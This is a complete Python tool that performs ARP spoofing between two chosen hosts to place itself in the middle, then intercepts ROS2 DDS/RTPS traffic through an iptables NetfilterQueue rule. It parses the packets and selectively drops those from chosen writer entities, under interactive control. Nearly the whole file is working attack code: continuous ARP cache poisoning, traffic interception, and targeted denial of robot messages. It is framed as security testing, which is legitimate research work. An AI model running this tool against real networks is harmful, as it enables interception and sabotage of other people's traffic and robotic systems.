"""
ARP Spoofing based Selective Packet Dropper

This tool performs ARP spoofing attacks and selectively drops RTPS packets
based on Writer Entity ID. It's designed for network security testing
and ROS2 DDS traffic analysis.

Usage:
    sudo python3 scapy_arpspoofing.py -i <interface> -a <targetA_ip> -b <targetB_ip>

Example:
    sudo python3 scapy_arpspoofing.py -i eth0 -a 192.168.1.10 -b 192.168.1.20

Commands during execution:
    '1' - Enable packet forwarding
    '0' - Disable packet forwarding (drop mode)  
    'hz' - Show packet rate statistics
    'drop <entity_id>' - Drop packets from specific entity
    'exit' - Stop and restore network
"""
import os
import sys
import time
import threading
import argparse
import platform
import subprocess
import struct
import binascii
from scapy.all import ARP, Ether, IP, UDP, Raw, sendp, srp, conf, sniff
from netfilterqueue import NetfilterQueue

# ─── State Management Class ───────────────────────────────────
class MitmState:
    """
    Manages MITM attack state and packet filtering rules
    
    This class handles:
    - Packet forwarding control (enable/disable)
    - Writer Entity ID statistics tracking
    - Packet output control
    - Entity ID drop list management
    """
    def __init__(self):
        self.lock = threading.Lock()
        # True: OS forwarding enabled, False: OS forwarding disabled (packet drop)
        self._forwarding_enabled = True
        # Writer Entity ID statistics (Hz calculation) - ROS2 topic hz method
        self._writer_entity_stats = {}  # {entity_id: {'timestamps': list, 'window_size': int}}
        # Packet output control
        self._packet_output_enabled = True
        # List of Writer Entity IDs to drop
        self._drop_entity_ids = set()

    @property
    def forwarding_enabled(self):
        with self.lock:
            return self._forwarding_enabled

    @forwarding_enabled.setter
    def forwarding_enabled(self, value):
        with self.lock:
            self._forwarding_enabled = value

    @property
    def packet_output_enabled(self):
        with self.lock:
            return self._packet_output_enabled

    @packet_output_enabled.setter
    def packet_output_enabled(self, value):
        with self.lock:
            self._packet_output_enabled = value

    def update_writer_entity_stats(self, entity_id: str):
        """Update Writer Entity ID statistics - ROS2 topic hz method"""
        with self.lock:
            current_time = time.time()
            if entity_id not in self._writer_entity_stats:
                self._writer_entity_stats[entity_id] = {
                    'timestamps': [],
                    'max_window_size': 5000  # Maximum 5000 entries, then sliding window
                }
            
            # Add timestamp
            self._writer_entity_stats[entity_id]['timestamps'].append(current_time)
            
            
            # max_window = self._writer_entity_stats[entity_id]['max_window_size']
            # if len(self._writer_entity_stats[entity_id]['timestamps']) > max_window:
            #     self._writer_entity_stats[entity_id]['timestamps'].pop(0)

    def get_writer_entity_hz_stats(self) -> dict:
        """Return Writer Entity ID Hz statistics - ROS2 topic hz method"""
        with self.lock:
            stats = {}
            for entity_id, data in self._writer_entity_stats.items():
                timestamps = data['timestamps']
                if len(timestamps) < 2:
                    continue  # Need at least 2 messages
                
                # Calculate arrival intervals (period) - filter duplicate packets
                periods = []
                for i in range(1, len(timestamps)):
                    period = timestamps[i] - timestamps[i-1]
                    # Remove too short periods (duplicate packets) - minimum 0.001 seconds
                    if period >= 0.001:
                        periods.append(period)
                
                if not periods:
                    continue
                
                # Remove outliers (ROS2 method)
                if len(periods) > 10:  # Only remove outliers when sufficient samples exist
                    mean_period = sum(periods) / len(periods)
                    variance = sum((p - mean_period) ** 2 for p in periods) / len(periods)
                    std_dev = variance ** 0.5
                    
                    # Keep only values within 2.5 standard deviations
                    filtered_periods = []
                    for p in periods:
                        if abs(p - mean_period) <= 2.5 * std_dev:
                            filtered_periods.append(p)
                    
                    # Use filtered values if sufficient (70% or more of original)
                    if len(filtered_periods) >= max(5, int(len(periods) * 0.7)):
                        periods = filtered_periods
                
                # Calculate statistics
                avg_period = sum(periods) / len(periods)
                min_period = min(periods)
                max_period = max(periods)
                
                # Calculate standard deviation
                variance = sum((p - avg_period) ** 2 for p in periods) / len(periods)
                std_dev = variance ** 0.5
                
                # Calculate Hz (inverse of average period) - no limit
                avg_hz = 1.0 / avg_period if avg_period > 0 else 0.0
                
                # Calculate min/max Hz (limited to reasonable range)
                # Minimum period limit (0.001s = 1000Hz) - prevent extreme values from duplicate packets
                min_period_limited = max(min_period, 0.001)  # Minimum 0.001 seconds
                max_period_limited = max(max_period, 0.001)  # Minimum 0.001 seconds
                
                min_hz = 1.0 / max_period_limited if max_period_limited > 0 else 0.0  # Maximum period = minimum Hz
                max_hz = 1.0 / min_period_limited if min_period_limited > 0 else 0.0  # Minimum period = maximum Hz
                
                # Limit Hz range to reasonable values (0.1 Hz ~ 10000 Hz)
                min_hz = max(0.1, min_hz)
                max_hz = min(10000.0, max_hz)
                avg_hz = max(0.1, min(10000.0, avg_hz))
                
                stats[entity_id] = {
                    'window': len(timestamps),
                    'avg_rate': avg_hz,
                    'min_rate': min_hz,
                    'max_rate': max_hz,
                    'std_dev': std_dev,
                    'avg_period': avg_period,
                    'min_period': min_period,
                    'max_period': max_period,
                    'last_seen': timestamps[-1],
                    # Additional debugging information
                    'periods_count': len(periods),
                    'total_time_span': timestamps[-1] - timestamps[0] if len(timestamps) > 1 else 0,
                    'expected_hz': (len(timestamps) - 1) / (timestamps[-1] - timestamps[0]) if len(timestamps) > 1 and timestamps[-1] != timestamps[0] else 0
                }
            return stats

    def clear_writer_entity_stats(self):
        """Writer Entity ID 통계 초기화"""
        with self.lock:
            self._writer_entity_stats.clear()
    
    def add_drop_entity_id(self, entity_id: str):
        """드랍할 Writer Entity ID 추가"""
        with self.lock:
            self._drop_entity_ids.add(entity_id)
            print(f"[+] Added {entity_id} to drop list")
    
    def remove_drop_entity_id(self, entity_id: str):
        """드랍 목록에서 Writer Entity ID 제거"""
        with self.lock:
            if entity_id in self._drop_entity_ids:
                self._drop_entity_ids.remove(entity_id)
                print(f"[-] Removed {entity_id} from drop list")
            else:
                print(f"[!] {entity_id} not in drop list")
    
    def clear_drop_entity_ids(self):
        """드랍 목록 초기화"""
        with self.lock:
            self._drop_entity_ids.clear()
            print("[+] Drop list cleared")
    
    def get_drop_entity_ids(self):
        """드랍 목록 반환"""
        with self.lock:
            return self._drop_entity_ids.copy()
    
    def should_drop_entity_id(self, entity_id: str) -> bool:
        """특정 Entity ID를 드랍해야 하는지 확인"""
        with self.lock:
            # return entity_id in self._drop_entity_ids

            clean_id = entity_id.upper().replace('0X', '')
            return clean_id in self._drop_entity_ids

def nfqueue_callback(packet, state):
    """NetfilterQueue callback function - drop packets from specific Writer Entity ID"""
    try:
        # Parse packet with Scapy
        pkt = IP(packet.get_payload())
        
        # Check if UDP packet (RTPS uses UDP)
        if pkt.haslayer(UDP):
            udp_payload = bytes(pkt[UDP].payload)
            
            # Check if RTPS packet
            if len(udp_payload) >= 4 and udp_payload[:4] == b'RTPS':
                # Parse RTPS packet
                rtps_data = parse_rtps_packet(udp_payload)
                
                # Check Writer Entity ID and decide whether to drop
                should_drop = False
                for submsg in rtps_data.get('submessages', []):
                    # if submsg['id'] == 0x15:  # DATA 
                        # print(f"    Writer Entity ID: {submsg.get('writer_entity_id', 'N/A')}")
                    writer_entity_id = submsg.get('writer_entity_id', 'N/A')
                    # print(writer_entity_id)
                    if writer_entity_id and state.should_drop_entity_id(writer_entity_id):
                        print(f"[DROP] Blocking packet with Writer Entity ID: {writer_entity_id}")
                        should_drop = True
                        break
                
                if should_drop:
                    packet.drop()  # Drop packet
                    return
                
                # Process non-dropped RTPS packets with existing packet_handler
                packet_handler(pkt, state)
        
        # Allow non-dropped packets
        packet.accept()
        
    except Exception as e:
        print(f"[!] Error in nfqueue_callback: {e}")
        packet.accept()  # Allow packet on error

def ensure_root():
    """
    Check if script is running with root privileges
    
    This tool requires root access for:
    - ARP table manipulation
    - iptables rule management
    - NetfilterQueue operations
    """
    if os.geteuid() != 0:
        sys.exit("[-] This script requires root privileges. Please run with 'sudo'.")

def set_ip_forwarding(enable: bool):
    """
    Enable or disable system IP forwarding
    
    Args:
        enable (bool): True to enable forwarding, False to disable
        
    This controls whether packets are forwarded between network interfaces.
    When disabled, packets are dropped (useful for testing network behavior).
    """
    value = "1" if enable else "0"
    sysname = platform.system()
    print("\n[Forwarding Control Starting.]")
    print(f"[*] Setting IP forwarding to {value} ...")
    try:
        if sysname == "Linux":
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=True, capture_output=True)
        elif sysname == "Darwin": # macOS
            subprocess.run(["sysctl", "-w", f"net.inet.ip.forwarding={value}"], check=True, capture_output=True)
        else:
            print(f"[-] Unsupported OS for automatic IP forwarding control: {sysname}")
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"[-] Failed to set IP forwarding: {e}")

def get_mac(ip: str, iface: str) -> str | None:
    """Get MAC address for given IP address"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
        timeout=2, retry=2, iface=iface, verbose=False
    )
    for _, resp in ans:
        return resp.hwsrc
    return None

def poison_arp(victim_ip, victim_mac, source_ip, iface):
    """
    Perform ARP poisoning attack
    
    Args:
        victim_ip: Target IP address to poison
        victim_mac: Target MAC address
        source_ip: IP address to impersonate
        iface: Network interface to use
        
    This sends fake ARP replies to make the victim think the attacker's MAC
    is associated with the source IP address.
    """
    arp = ARP(op=2, pdst=victim_ip, psrc=source_ip, hwdst=victim_mac)
    sendp(Ether(dst=victim_mac)/arp, iface=iface, verbose=False)

def restore_arp(victim_ip, victim_mac, source_ip, source_mac, iface):
    """
    Restore ARP table to original state
    
    Args:
        victim_ip: Target IP address
        victim_mac: Target MAC address  
        source_ip: Original IP address
        source_mac: Original MAC address
        iface: Network interface to use
        
    This sends correct ARP replies to restore the victim's ARP table
    to its original state before the attack.
    """
    arp = ARP(op=2, pdst=victim_ip, psrc=source_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=source_mac)
    sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/arp, count=5, iface=iface, verbose=False)



def arp_poison_loop(stop_event, targets, iface):
    """Periodically perform ARP Poisoning to maintain MITM state"""
    while not stop_event.is_set():
        poison_arp(targets['A']['ip'], targets['A']['mac'], targets['B']['ip'], iface)
        poison_arp(targets['B']['ip'], targets['B']['mac'], targets['A']['ip'], iface)
        time.sleep(3)

def control_loop(stop_event, state):
    """Control OS IP forwarding state based on user input"""
    print("\n[*] Control enabled. Enter commands:")
    print("  - '1': Enable OS IP forwarding")
    print("  - '0': Disable OS IP forwarding (Drop Mode)")
    print("  - 'hz': Show Writer Entity ID Hz statistics")
    print("  - 'clear': Clear Hz statistics")
    print("  - 'output on/off': Enable/disable packet output")
    print("  - 'drop <entity_id>': Add Entity ID to drop list")
    print("  - 'undrop <entity_id>': Remove Entity ID from drop list")
    print("  - 'drop list': Show current drop list")
    print("  - 'drop clear': Clear drop list")
    print("  - 'exit': Stop the script and restore network")

    while not stop_event.is_set():
        try:
            cmd = input('> ').strip().lower()
            if cmd == '1':
                if not state.forwarding_enabled:
                    set_ip_forwarding(True)
                    state.forwarding_enabled = True
                print("[+] OS IP forwarding is now ENABLED.")
            elif cmd == '0':
                if state.forwarding_enabled:
                    set_ip_forwarding(False)
                    state.forwarding_enabled = False
                print("[-] OS IP forwarding is now DISABLED (Drop Mode).")
            elif cmd == 'hz':
                stats = state.get_writer_entity_hz_stats()
                if stats:
                    print("\n[Writer Entity ID Hz Statistics - ROS2 style]")
                    for entity_id, data in sorted(stats.items(), key=lambda x: x[1]['avg_rate'], reverse=True):
                        last_seen_str = time.strftime('%H:%M:%S', time.localtime(data['last_seen']))
                        print(f"\nEntity ID: {entity_id}")
                        print(f"  average rate: {data['avg_rate']:.3f} Hz")
                        print(f"  min: {data['min_rate']:.3f} Hz, max: {data['max_rate']:.3f} Hz, std dev: {data['std_dev']:.6f} s")
                        print(f"  window: {data['window']}")
                        print(f"  last seen: {last_seen_str}")
                        # Add debugging information
                        print(f"  DEBUG - avg period: {data['avg_period']:.6f} s")
                        print(f"  DEBUG - periods count: {data['periods_count']}")
                        print(f"  DEBUG - total time span: {data['total_time_span']:.2f} s")
                        print(f"  DEBUG - expected Hz (simple): {data['expected_hz']:.3f} Hz")
                else:
                    print("[!] No Writer Entity ID statistics available yet.")
            elif cmd == 'clear':
                state.clear_writer_entity_stats()
                print("[+] Writer Entity ID Hz statistics cleared.")
            elif cmd == 'output on':
                state.packet_output_enabled = True
                print("[+] Packet output ENABLED.")
            elif cmd == 'output off':
                state.packet_output_enabled = False
                print("[-] Packet output DISABLED.")
            elif cmd.startswith('drop '):
                parts = cmd.split(' ', 1)
                if len(parts) == 2:
                    entity_id = parts[1].upper()
                    if entity_id == 'LIST':
                        drop_list = state.get_drop_entity_ids()
                        if drop_list:
                            print(f"[*] Current drop list: {', '.join(sorted(drop_list))}")
                        else:
                            print("[*] Drop list is empty")
                    elif entity_id == 'CLEAR':
                        state.clear_drop_entity_ids()
                    else:
                        state.add_drop_entity_id(entity_id)
                else:
                    print("[!] Usage: drop <entity_id> | drop list | drop clear")
            elif cmd.startswith('undrop '):
                parts = cmd.split(' ', 1)
                if len(parts) == 2:
                    entity_id = parts[1].upper()
                    state.remove_drop_entity_id(entity_id)
                else:
                    print("[!] Usage: undrop <entity_id>")
            elif cmd == 'exit':
                stop_event.set()
                break
            else:
                print("[!] Unknown command. Available commands: 1, 0, hz, clear, output on/off, drop, undrop, exit")
        except (EOFError, KeyboardInterrupt):
            stop_event.set()
            break

# ─── RTPS Endpoint Extraction Functions ───────────────────────────────────
def u16(data: bytes, le: bool = True) -> int:
    """Read 16-bit integer in little/big endian"""
    return int.from_bytes(data[:2], 'little' if le else 'big')

def u64(data: bytes, le: bool = True) -> int:
    """Read 64-bit integer in little/big endian"""
    return int.from_bytes(data[:8], 'little' if le else 'big')

def guid_hex(prefix: bytes, entity_id: bytes) -> str:
    """Convert GUID to hex string"""
    prefix_hex = prefix.hex()
    entity_hex = entity_id.hex()
    return f"{prefix_hex[:8]}-{prefix_hex[8:12]}-{prefix_hex[12:16]}-{prefix_hex[16:20]}-{prefix_hex[20:24]}{entity_hex}"

def parse_rtps_packet(udp_payload: bytes) -> dict:
    """
    Parse RTPS packet completely and return structured information
    """
    if not udp_payload.startswith(b"RTPS"):
        return None
    
    # Parse RTPS header
    rtps_header = {
        'magic': udp_payload[0:4].decode('ascii'),
        'protocol_version': f"{udp_payload[4]}.{udp_payload[5]}",
        'vendor_id': f"{udp_payload[6]:02x}.{udp_payload[7]:02x}",
        'guid_prefix': binascii.hexlify(udp_payload[8:20]).decode()
    }
    header_guid_prefix = udp_payload[8:20]  # 12B

    # Current context (updated by INFO_SRC/INFO_DST)
    cur_src_prefix = header_guid_prefix
    cur_dst_prefix = None  # Receiver GuidPrefix is known only when INFO_DST arrives

    submessages = []
    pos = 20  # Submessage start

    while pos + 4 <= len(udp_payload):
        # Submessage header
        submsg_id = udp_payload[pos]
        flags     = udp_payload[pos + 1]
        le        = bool(flags & 0x01)  # E-flag
        length    = u16(udp_payload[pos + 2:pos + 4], le)
        body_beg  = pos + 4
        body_end  = body_beg + length
        if body_end > len(udp_payload):
            break  # Defend against truncated packets

        submsg_info = {
            'id': submsg_id,
            'id_name': get_submessage_name(submsg_id),
            'flags': flags,
            'length': length,
            'position': pos
        }
        body = udp_payload[body_beg:body_end]

        # --- Parse by submessage type ---
        if submsg_id == 0x0e:  # INFO_DST: 12B GuidPrefix
            if len(body) >= 12:
                cur_dst_prefix = body[:12]
                submsg_info['destination_guid_prefix'] = cur_dst_prefix.hex()

        elif submsg_id == 0x0c:  # INFO_SRC: ProtocolVersion(2)+VendorId(2)+GuidPrefix(12)
            if len(body) >= 16:
                cur_src_prefix = body[4:16]
                submsg_info['source_guid_prefix'] = cur_src_prefix.hex()

        elif submsg_id == 0x09:  # INFO_TS: 8B (when valid)
            if len(body) >= 8:
                submsg_info['timestamp'] = u64(body[0:8], le)

        elif submsg_id == 0x15:  # DATA
            # DATA layout: extraFlags(2) | o2iq(2) | readerId(4) | writerId(4) | writerSeq(8) | [InlineQoS] | [Payload]
            if len(body) >= 20:
                extra_flags = u16(body[0:2], le)
                o2iq        = u16(body[2:4], le)
                reader_id   = body[4:8]
                writer_id   = body[8:12]
                writer_sn   = u64(body[12:20], le)

                submsg_info.update({
                    'extra_flags': extra_flags,
                    'octets_to_inline_qos': o2iq,
                    'reader_entity_id': reader_id.hex(),
                    'writer_entity_id': writer_id.hex(),
                    'writer_seq_num': writer_sn,
                    'writer_guid': guid_hex(cur_src_prefix, writer_id)
                })
                if reader_id != b'\x00\x00\x00\x00' and cur_dst_prefix is not None:
                    submsg_info['reader_guid'] = guid_hex(cur_dst_prefix, reader_id)

                # Calculate InlineQoS/SerializedPayload position
                # o2iq is offset from "submessage header start (pos)"
                inline_qos_start = pos + o2iq
                data_start = inline_qos_start

                # Skip InlineQoS (ParameterList): until Sentinel (pid=0x0001,len=0)
                if o2iq != 0 and (pos + 4) <= data_start < body_end:
                    while data_start + 4 <= body_end:
                        # QoS PID/len is usually handled as LE in most implementations
                        pid  = int.from_bytes(udp_payload[data_start:data_start+2], 'little')
                        plen = int.from_bytes(udp_payload[data_start+2:data_start+4], 'little')
                        data_start += 4
                        if pid == 0x0001 and plen == 0:  # Sentinel
                            break
                        data_start += plen
                        data_start = (data_start + 3) & ~0x03  # 4-byte alignment
                    data_start = (data_start + 3) & ~0x03

                # Skip CDR header (4B) and extract Payload (when available)
                if data_start + 4 <= body_end:
                    data_start += 4
                    payload = udp_payload[data_start:body_end]
                    submsg_info['payload_size'] = len(payload)
                    submsg_info['payload_preview'] = binascii.hexlify(payload[:32]).decode()

        elif submsg_id in (0x07, 0x06):  # HEARTBEAT/ACKNACK
            # Common header: readerId(4) | writerId(4)
            if len(body) >= 8:
                reader_id = body[0:4]
                writer_id = body[4:8]
                submsg_info.update({
                    'reader_entity_id': reader_id.hex(),
                    'writer_entity_id': writer_id.hex(),
                    'writer_guid': guid_hex(cur_src_prefix, writer_id)
                })
                if reader_id != b'\x00\x00\x00\x00' and cur_dst_prefix is not None:
                    submsg_info['reader_guid'] = guid_hex(cur_dst_prefix, reader_id)

        # Accumulate results and move to next submessage
        submessages.append(submsg_info)
        if length == 0:
            break
        pos = body_end

    return {
        'header': rtps_header,
        'submessages': submessages,
        'total_size': len(udp_payload)
    }

def get_submessage_name(submsg_id: int) -> str:
    """Convert submessage ID to name"""
    names = {
        0x01: "PAD",
        0x06: "ACKNACK", 
        0x07: "HEARTBEAT",
        0x08: "GAP",
        0x09: "INFO_TS",
        0x0c: "INFO_SRC",
        0x0d: "INFO_REPLY_IP4",
        0x0e: "INFO_DST",
        0x0f: "INFO_REPLY",
        0x12: "NACK_FRAG",
        0x13: "HEARTBEAT_FRAG",
        0x15: "DATA",
        0x16: "DATA_FRAG"
    }
    return names.get(submsg_id, f"UNKNOWN(0x{submsg_id:02x})")

def guid_to_uuid(prefix: bytes, entity_id: bytes) -> str:
    """Convert GUID to UUID format"""
    prefix_hex = binascii.hexlify(prefix).decode()
    entity_hex = binascii.hexlify(entity_id).decode()
    return f"{prefix_hex[:8]}-{prefix_hex[8:12]}-{prefix_hex[12:16]}-{prefix_hex[16:20]}-{prefix_hex[20:24]}{entity_hex}"

def extract_rtps_endpoints(udp_payload: bytes) -> list[dict]:
    """
    Extract endpoint information from RTPS packet and return as list
    """
    parsed = parse_rtps_packet(udp_payload)
    if not parsed:
        return []
    
    endpoints = []
    for submsg in parsed['submessages']:
        if submsg['id'] == 0x15:  # DATA
            endpoint_info = {
                'reader_guid': submsg.get('reader_guid', ''),
                'writer_guid': submsg.get('writer_guid', ''),
                'writer_entity_key': submsg.get('writer_entity_key', ''),
                'writer_entity_id': submsg.get('writer_entity_id', ''),
                'payload_size': submsg.get('payload_size', 0),
                'payload_preview': submsg.get('payload_preview', ''),
                'submessage_type': 'DATA'
            }
            endpoints.append(endpoint_info)
    
    return endpoints

def packet_handler(pkt, state):
    """
    Extract and log RTPS endpoints from captured packets.
    """
    if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
        return

    # Extract UDP payload
    raw = bytes(pkt[UDP].payload)
    
    # Check if RTPS packet
    if not raw.startswith(b"RTPS"):
        return
    
    # Complete RTPS packet parsing
    parsed = parse_rtps_packet(raw)
    if not parsed:
        return
    
    # Update Writer Entity ID statistics (always performed regardless of output)
    for submsg in parsed['submessages']:
        if submsg['id'] == 0x15:  # DATA
            writer_entity_id_hex = submsg.get('writer_entity_id', '')
            if writer_entity_id_hex and len(writer_entity_id_hex) >= 6:
                state.update_writer_entity_stats(writer_entity_id_hex)
    
    # Don't output if packet output is disabled
    if not state.packet_output_enabled:
        return
    
    mode = "FORWARD" if state.forwarding_enabled else "DROP"
    src = f"{pkt[IP].src}:{pkt[UDP].sport}"
    dst = f"{pkt[IP].dst}:{pkt[UDP].dport}"
    
    print(f"\n{'='*80}")
    print(f"[{mode}] {src} -> {dst}")
    print(f"RTPS Packet Analysis:")
    print(f"  Protocol Version: {parsed['header']['protocol_version']}")
    print(f"  Vendor ID: {parsed['header']['vendor_id']}")
    print(f"  GUID Prefix: {parsed['header']['guid_prefix']}")
    print(f"  Total Size: {parsed['total_size']} bytes")
    print(f"  Submessages: {len(parsed['submessages'])}")
    
    # Output submessage information
    for i, submsg in enumerate(parsed['submessages'], 1):
        print(f"  Submessage {i}: {submsg['id_name']} (ID: 0x{submsg['id']:02x}, Length: {submsg['length']})")
        
        if submsg['id'] == 0x0e:  # INFO_DST
            print(f"    Destination GUID Prefix: {submsg.get('destination_guid_prefix', 'N/A')}")
        elif submsg['id'] == 0x0c:  # INFO_SRC
            print(f"    Source GUID Prefix: {submsg.get('source_guid_prefix', 'N/A')}")
        elif submsg['id'] == 0x09:  # INFO_TS
            print(f"    Timestamp: {submsg.get('timestamp', 'N/A')}")
        elif submsg['id'] == 0x15:  # DATA
            print(f"    Reader GUID: {submsg.get('reader_guid', 'N/A')}")
            print(f"    Writer GUID: {submsg.get('writer_guid', 'N/A')}")
            print(f"    Reader Entity ID: {submsg.get('reader_entity_id', 'N/A')}")
            print(f"    Writer Entity ID: {submsg.get('writer_entity_id', 'N/A')}")
            print(f"    Writer Sequence Number: {submsg.get('writer_seq_num', 'N/A')}")
            print(f"    Payload Size: {submsg.get('payload_size', 0)} bytes")
            if submsg.get('payload_preview'):
                print(f"    Payload Preview: {submsg['payload_preview'][:64]}...")
            
            # Extract Entity Key from Writer Entity ID (first 3 bytes)
            writer_entity_id_hex = submsg.get('writer_entity_id', '')
            if writer_entity_id_hex and len(writer_entity_id_hex) >= 6:
                try:
                    # Convert hex string to bytes and extract Entity Key
                    entity_id_bytes = bytes.fromhex(writer_entity_id_hex)
                    if len(entity_id_bytes) >= 3:
                        writer_entity_key = int.from_bytes(entity_id_bytes[:3], 'little')
                        print(f"    Writer Entity Key: 0x{writer_entity_key:06x}")
                        
                        # Special display for 0x00001203 Writer Entity ID
                        if writer_entity_key == 0x1203:
                            print(f"    [*** TARGET FOUND: Writer Entity Key 0x000012 ***]")
                except ValueError:
                    pass
        elif submsg['id'] in (0x07, 0x06):  # HEARTBEAT/ACKNACK
            print(f"    Reader GUID: {submsg.get('reader_guid', 'N/A')}")
            print(f"    Writer GUID: {submsg.get('writer_guid', 'N/A')}")
            print(f"    Reader Entity ID: {submsg.get('reader_entity_id', 'N/A')}")
            print(f"    Writer Entity ID: {submsg.get('writer_entity_id', 'N/A')}")
    
    print(f"{'='*80}")

# ─── Main Execution Function ───────────────────────────────────────────
def main():
    """
    Main function - Entry point for the ARP spoofing tool
    
    This function:
    1. Parses command line arguments
    2. Sets up ARP poisoning between two targets
    3. Configures packet filtering with NetfilterQueue
    4. Starts interactive control interface
    5. Handles cleanup on exit
    """
    parser = argparse.ArgumentParser(
        description="ARP Spoofing based Selective Packet Dropper (OS Forwarding Control)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-i", "--iface", required=True, help="Network interface for sniffing and spoofing")
    parser.add_argument("-a", "--targetA", required=True, help="IP address of Node A")
    parser.add_argument("-b", "--targetB", required=True, help="IP address of Node B")
    args = parser.parse_args()

    ensure_root()
    
    # Enable OS IP forwarding when script starts
    set_ip_forwarding(True)

    conf.iface = args.iface
    conf.verb = 0 # Disable unnecessary Scapy output

    print("[*] Resolving MAC addresses...")
    mac_A = get_mac(args.targetA, args.iface)
    mac_B = get_mac(args.targetB, args.iface)
    
    if not mac_A or not mac_B:
        sys.exit("[-] Could not resolve MAC addresses. Check IPs and network connectivity.")
    
    targets = {
        'A': {'ip': args.targetA, 'mac': mac_A},
        'B': {'ip': args.targetB, 'mac': mac_B}
    }
    print("[+] Target Information:")
    print(f"  - Node A: {targets['A']['ip']} ({targets['A']['mac']})")
    print(f"  - Node B: {targets['B']['ip']} ({targets['B']['mac']})")

    # Initialize state and event objects
    state = MitmState() # Default is forwarding_enabled = True
    stop_event = threading.Event()

    # Create and start threads
    threads = [
        threading.Thread(target=arp_poison_loop, args=(stop_event, targets, args.iface), daemon=True),
        threading.Thread(target=control_loop, args=(stop_event, state), daemon=True)
    ]
    for t in threads:
        t.start()

    # NetfilterQueue setup
    print(f"\n[*] Setting up NetfilterQueue for selective packet dropping...")
    print(f"[*] Target hosts: {args.targetA} <-> {args.targetB}")
    print(f"[*] RTPS ports: 13100-13500")
    
    # Add iptables rules (redirect RTPS traffic to NFQUEUE)
    queue_num = 0
    iptables_cmd = f"iptables -I FORWARD -p udp --dport 13100:13500 -j NFQUEUE --queue-num {queue_num}"
    cleanup_cmd = f"iptables -D FORWARD -p udp --dport 13100:13500 -j NFQUEUE --queue-num {queue_num}"

    # iptables_cmd = f"iptables -I FORWARD -p udp --dport 7400:7500 -j NFQUEUE --queue-num {queue_num}"
    # cleanup_cmd = f"iptables -D FORWARD -p udp --dport 7400:7500 -j NFQUEUE --queue-num {queue_num}"
    
    try:
        # Add iptables rules
        subprocess.run(iptables_cmd.split(), check=True)
        print(f"[+] Added iptables rule: {iptables_cmd}")
        
        # Start NetfilterQueue
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_num, lambda pkt: nfqueue_callback(pkt, state))
        print(f"[+] NetfilterQueue bound to queue {queue_num}")
        
        # Start packet processing
        print("[*] Starting packet filtering...")
        nfqueue.run()
        
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
    finally:
        print("\n[*] Stopping all threads and restoring network...")
        stop_event.set()
        
        # Clean up NetfilterQueue
        try:
            nfqueue.unbind()
            print("[+] NetfilterQueue unbound")
        except:
            pass
        
        # Remove iptables rules
        try:
            subprocess.run(cleanup_cmd.split(), check=True)
            print(f"[+] Removed iptables rule: {cleanup_cmd}")
        except:
            print(f"[!] Failed to remove iptables rule: {cleanup_cmd}")
        
        for t in threads:
            t.join(timeout=1) # Wait briefly for threads to terminate
        
        # Restore ARP table
        restore_arp(targets['A']['ip'], targets['A']['mac'], targets['B']['ip'], targets['B']['mac'], args.iface)
        restore_arp(targets['B']['ip'], targets['B']['mac'], targets['A']['ip'], targets['A']['mac'], args.iface)
        
        # Restore OS IP forwarding to original state (enabled) before script exit
        set_ip_forwarding(True)
        print("[+] Network restored. Exiting.")

if __name__ == "__main__":
    main()


